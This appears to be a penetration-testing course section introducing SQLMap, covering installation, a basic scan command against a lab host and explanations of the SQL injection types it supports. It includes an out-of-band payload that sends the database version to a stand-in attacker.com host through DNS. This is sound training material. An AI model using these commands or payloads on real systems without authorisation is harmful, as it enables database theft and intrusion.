[SQLMap](https://github.com/sqlmapproject/sqlmap) is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws. SQLMap has been continuously developed since 2006 and is still maintained today.

```shell-session
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

|   |   |   |
|---|---|---|
|Target connection|Injection detection|Fingerprinting|
|Enumeration|Optimization|Protection detection and bypass using "tamper" scripts|
|Database content retrieval|File system access|Execution of the operating system (OS) commands|

## SQLMap Installation

```shell-session
sudo apt install sqlmap
```

```shell-session

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

## Supported SQL Injection Types

SQLMap is the only penetration testing tool that can properly detect and exploit all known SQLi types. We see the types of SQL injections supported by SQLMap with the `sqlmap -hh` command:

```shell-session
sqlmap -hh
```
## Boolean-based blind SQL Injection

SQLMap exploits `Boolean-based blind SQL Injection` vulnerabilities through the differentiation of `TRUE` from `FALSE` query results, effectively retrieving 1 byte of information per request.

## Error-based SQL Injection

If the `database management system` (`DBMS`) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries. In such cases, specialized payloads for the current DBMS are used, targeting the functions that cause known misbehaviors.

## UNION query-based

With the usage of `UNION`, it is generally possible to extend the original (`vulnerable`) query with the injected statements' results. This way, if the original query results are rendered as part of the response, the attacker can get additional results from the injected statements within the page response itself. This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request.

## Stacked queries

Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one. In case that there is a requirement for running non-query statements (e.g. `INSERT`, `UPDATE` or `DELETE`), stacking must be supported by the vulnerable platform (e.g., `Microsoft SQL Server` and `PostgreSQL` support it by default). SQLMap can use such vulnerabilities to run non-query statements executed in advanced features (e.g., execution of OS commands) and data retrieval similarly to time-based blind SQLi types.

## Time-based blind SQL Injection

The principle of `Time-based blind SQL Injection` is similar to the `Boolean-based blind SQL Injection`, but here the response time is used as the source for the differentiation between `TRUE` or `FALSE`.

## Inline queries

```sql
SELECT (SELECT @@version) from
```

## Out-of-band SQL Injection

```sql

LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```
This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.

